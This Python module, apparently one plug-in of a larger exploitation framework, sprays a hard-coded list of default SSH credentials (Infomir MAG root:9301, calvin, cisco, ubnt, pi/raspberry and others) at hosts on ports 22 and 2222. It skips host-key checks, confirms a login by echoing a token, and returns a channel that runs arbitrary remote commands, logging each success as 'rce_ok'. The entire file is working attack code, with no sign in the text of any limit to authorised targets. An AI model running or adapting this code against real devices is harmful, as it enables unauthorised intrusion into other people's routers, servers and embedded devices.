"""SSH-Default-Creds (u.a. Infomir MAG root:9301)."""
from __future__ import annotations
import time

from .exploit import RunResult

try:
    import paramiko
except Exception:
    paramiko = None

CREDS = [("root", "9301"), ("root", "calvin"), ("ADMIN", "ADMIN"), ("root", "root"),
         ("admin", "9301"), ("root", "admin"), ("admin", "admin"), ("Administrator", "admin"),
         ("admin", "password"), ("cisco", "cisco"), ("ubnt", "ubnt"), ("root", "123456"),
         ("ubuntu", "ubuntu"), ("pi", "raspberry")]


class SSHChannel:
    def __init__(self, host, port, user, pw):
        self.host, self.port, self.user, self.pw = host, port, user, pw
        self.client = None

    def _conn(self):
        if self.client:
            return self.client
        c = paramiko.SSHClient()
        c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(self.host, port=self.port, username=self.user, password=self.pw,
                  timeout=10, banner_timeout=12, auth_timeout=12,
                  look_for_keys=False, allow_agent=False)
        self.client = c
        return c

    def run(self, target, cmd, timeout=None, audit=None):
        try:
            c = self._conn()
            _in, out, err = c.exec_command(cmd, timeout=timeout or 30)
            data = out.read().decode("utf-8", "replace") + err.read().decode("utf-8", "replace")
        except Exception as e:
            self.client = None
            if audit:
                audit.write("vector", "rce_fail", getattr(target, "url", str(target)),
                            vector="ssh", cmd=cmd, error=type(e).__name__)
            return RunResult(False, "", type(e).__name__, 3)
        if audit:
            audit.write("vector", "rce_ok" if data.strip() else "rce_fail",
                        getattr(target, "url", str(target)), vector="ssh",
                        cmd=cmd, head=data[:200])
        return RunResult(True, data)

    def proof(self, target, token, timeout=None, audit=None):
        return token in self.run(target, f"echo {token}", audit=audit).stdout


def detect(t) -> bool:
    return paramiko is not None and t.port in (22, 2222)


def open_(t, audit):
    for u, p in CREDS:
        ch = SSHChannel(t.host, t.port, u, p)
        try:
            if ch.proof(t.url, "SSHOK"):
                audit.write("vector", "opened", t.url, vector=f"ssh:{u}")
                return ch
        except Exception:
            continue
        time.sleep(0.1)
    return None
